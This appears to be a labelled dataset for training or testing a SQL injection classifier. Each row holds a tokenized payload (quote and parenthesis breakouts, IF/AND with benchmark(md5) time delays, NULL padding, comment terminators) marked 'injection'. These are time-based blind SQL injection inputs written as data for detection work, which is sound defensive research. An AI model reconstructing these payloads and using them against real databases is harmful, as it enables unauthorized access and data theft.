81,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
82,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
83,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
84,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
85,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
86,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
87,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
88,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
89,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
0,CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
1,CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
2,CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
3,SQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
4,SQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
5,SQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
6,DQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
7,DQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
8,DQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
9,RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
10,RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
11,RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
12,SQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
13,SQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
14,SQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
15,DQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
16,DQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
17,DQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
0,AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
1,AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
2,AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
3,SQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
4,SQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
5,SQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
6,DQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
7,DQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
8,DQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
9,RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
10,RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
11,RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
12,RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
13,RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
14,RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
15,RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
16,RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
17,RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
18,RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
19,RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
20,RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
21,SQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
22,SQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
23,SQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
24,DQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
25,DQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
26,DQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
27,SQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
28,SQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
29,SQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
30,DQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
31,DQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
32,DQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
33,SQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
34,SQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
35,SQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
36,DQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
37,DQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
38,DQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
39,SQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
40,SQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
41,SQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
42,DQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
43,DQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
44,DQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
